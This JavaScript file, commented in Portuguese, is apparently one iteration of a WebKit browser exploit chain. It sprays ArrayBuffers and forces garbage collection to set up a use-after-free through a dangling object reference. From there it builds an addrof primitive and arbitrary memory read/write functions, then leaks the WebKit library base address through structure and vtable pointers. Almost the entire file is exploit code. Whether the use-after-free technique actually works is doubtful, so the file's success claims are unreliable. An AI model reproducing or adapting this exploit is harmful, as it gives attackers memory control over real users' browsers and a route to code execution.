// js/script3/testArrayBufferVictimCrash.mjs (v82 - R56 - Varredura de Alinhamento)
// =======================================================================================
// ESTA VERSÃO ABANDONA A ADIVINHAÇÃO E IMPLEMENTA UMA VARREDURA SISTEMÁTICA
// PARA DESCOBRIR O ALINHAMENTO DE MEMÓRIA CORRETO.
// - Fase 6: Itera sobre todas as propriedades do objeto 'victim' para encontrar
//   qual delas se alinha com o marcador do ArrayBuffer e pode ser usada para escrita.
// - Esta abordagem é mais lenta, mas muito mais confiável.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R56_AlignScan";

function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8); const u32 = new Uint32Array(buf); const f64 = new Float64Array(buf);
    u32[0] = int64.low(); u32[1] = int64.high(); return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8); (new Float64Array(buf))[0] = double; const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R56 - Varredura de Alinhamento)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Varredura de Alinhamento via UAF (R56) ---`, "test");
    
    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
    let dangling_ref = null;
    let spray_buffers = [];

    try {
        // --- FASES 1-4 (Preparação do UAF) ---
        logS3("--- FASE 1-4: Preparando o UAF (GC, Dangling Pointer, Spray)... ---", "subtest");
        await triggerGC_Hyper();
        dangling_ref = sprayAndCreateDanglingPointer();
        await triggerGC_Hyper(); await PAUSE_S3(100); await triggerGC_Hyper();
        for (let i = 0; i < 1024; i++) {
            const buf = new ArrayBuffer(136);
            const view = new BigUint64Array(buf);
            view[0] = 0x4141414141414141n; // Marcador
            view[1] = 0x4242424242424242n; // Ponteiro de dados
            spray_buffers.push(buf);
        }
        logS3("    Preparação do UAF concluída.", "info");

        // --- FASE 5: Vazamento do Ponteiro (addrof) ---
        logS3("--- FASE 5: Vazando ponteiro (addrof)... ---", "subtest");
        if (typeof dangling_ref.corrupted_prop !== 'number') {
            throw new Error(`Falha no UAF. Tipo da propriedade era '${typeof dangling_ref.corrupted_prop}', esperado 'number'.`);
        }
        const jscell_addr = doubleToInt64(dangling_ref.corrupted_prop);
        logS3(`++++++++++++ SUCESSO! Primitiva 'addrof' obtida! ++++++++++++`, "vuln");
        logS3(`Endereço do JSCell (Objeto): ${jscell_addr.toString(true)}`, "leak");

        // --- FASE 6: Varredura de Alinhamento para Encontrar a Propriedade de Escrita ---
        logS3("--- FASE 6: Varrendo propriedades para encontrar alinhamento de escrita... ---", "subtest");
        
        const victim_properties = Object.keys(sprayAndCreateDanglingPointer()); // Pega todos os nomes de propriedade
        let write_prop_name = null;
        let control_prop_name = null;
        let corrupted_buffer = null;

        for (const prop_name of victim_properties) {
            // Ignora a propriedade que já usamos para ler, ela pode não ser útil para escrever.
            if (prop_name === 'corrupted_prop') continue;

            logS3(`    Testando propriedade de escrita: '${prop_name}'...`, 'debug');

            // Restaura o marcador em todos os buffers antes de cada teste
            spray_buffers.forEach(b => new BigUint64Array(b)[0] = 0x4141414141414141n);
            
            // Escreve um valor de teste na propriedade atual
            dangling_ref[prop_name] = int64ToDouble(new AdvancedInt64(0xDEADBEEF, 0xCAFEFEED));

            // Procura qual buffer foi corrompido
            let found_buffer_this_iter = null;
            for (const buf of spray_buffers) {
                if (new BigUint64Array(buf)[0] !== 0x4141414141414141n) {
                    found_buffer_this_iter = buf;
                    break;
                }
            }
            
            if (found_buffer_this_iter) {
                write_prop_name = prop_name;
                corrupted_buffer = found_buffer_this_iter;
                
                // Agora, precisamos encontrar a propriedade que controla o ponteiro de dados.
                // Geralmente é a próxima propriedade de 64 bits.
                const current_prop_index = victim_properties.indexOf(write_prop_name);
                if (current_prop_index + 1 < victim_properties.length) {
                    control_prop_name = victim_properties[current_prop_index + 1];
                }
                break; // Sai do loop de varredura
            }
        }
        
        if (!write_prop_name || !control_prop_name || !corrupted_buffer) {
            throw new Error("Varredura de alinhamento falhou. Nenhuma propriedade sobrescreveu o marcador ou não foi possível determinar a propriedade de controle.");
        }

        logS3(`++++++++++++ SUCESSO! Alinhamento encontrado! ++++++++++++`, "vuln");
        logS3(`    Propriedade de Escrita (Dados): '${write_prop_name}'`, "good");
        logS3(`    Propriedade de Controle (Endereço): '${control_prop_name}'`, "good");

        // --- FASE 7: Construção das Primitivas de Leitura/Escrita Arbitrária ---
        logS3("--- FASE 7: Construindo primitivas de R/W Arbitrário... ---", "subtest");
        const hacked_view = new DataView(corrupted_buffer);

        const arb_read = (address) => {
            if (!isAdvancedInt64Object(address)) address = new AdvancedInt64(address);
            dangling_ref[control_prop_name] = int64ToDouble(address);
            const low = hacked_view.getUint32(0, true);
            const high = hacked_view.getUint32(4, true);
            return new AdvancedInt64(low, high);
        };

        const arb_write = (address, value) => {
            if (!isAdvancedInt64Object(address)) address = new AdvancedInt64(address);
            if (!isAdvancedInt64Object(value)) value = new AdvancedInt64(value);
            dangling_ref[control_prop_name] = int64ToDouble(address);
            dangling_ref[write_prop_name] = int64ToDouble(value); // Usa a propriedade descoberta
        };
        logS3("Funções 'arb_read' e 'arb_write' criadas com sucesso!", "vuln");
        
        // --- FASE 8: Demonstração e Vazamento do Endereço Base do WebKit ---
        logS3("--- FASE 8: Demonstração - Vazando a base do WebKit... ---", "subtest");
        const structure_ptr = arb_read(jscell_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
        const vtable_ptr = arb_read(structure_ptr);
        const webkit_base = vtable_ptr.sub(new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]));
        logS3(`++++++++++++ SUCESSO! Base do WebKit vazada! ++++++++++++`, "vuln");
        logS3(`Endereço Base do WebKit: ${webkit_base.toString(true)}`, "leak");
        
        final_result = { 
            success: true, 
            message: "Primitivas de R/W Arbitrário construídas e validadas com sucesso!",
            webkit_base_addr: webkit_base.toString(true),
        };

    } catch (e) {
        final_result.message = `Exceção na cadeia UAF: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: final_result,
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success
    };
}


// --- Funções Auxiliares ---

async function triggerGC_Hyper() {
    logS3("    Acionando GC Agressivo (Hyper)...", "info");
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 1000; i++) {
            gc_trigger_arr.push(new ArrayBuffer(1024 * 1024 * Math.min(i, 256)));
            gc_trigger_arr.push(new Array(1024 * i).fill(0));
        }
    } catch (e) {
        logS3("    Memória esgotada durante o GC Hyper, o que é esperado e bom.", "info");
    }
    await PAUSE_S3(500);
}

function sprayAndCreateDanglingPointer() {
    let dangling_ref_internal = null;
    function createScope() {
        // Objeto grande para forçar alocação no heap e ter propriedades suficientes para a varredura
        const victim = {
            prop_a: 0.1, prop_b: 0.2, prop_c: 0.3, prop_d: 0.4,
            prop_e: 0.5, prop_f: 0.6, prop_g: 0.7, prop_h: 0.8,
            prop_i: 0.9, prop_j: 0.10, prop_k: 0.11, prop_l: 0.12,
            prop_m: 0.13, prop_n: 0.14, prop_o: 0.15, prop_p: 0.16,
            corrupted_prop: 0.12345, // Usada para o addrof inicial
        };
        dangling_ref_internal = victim;
        for(let i=0; i<100; i++) { dangling_ref_internal.prop_a += 1; }
    }
    createScope();
    return dangling_ref_internal;
}
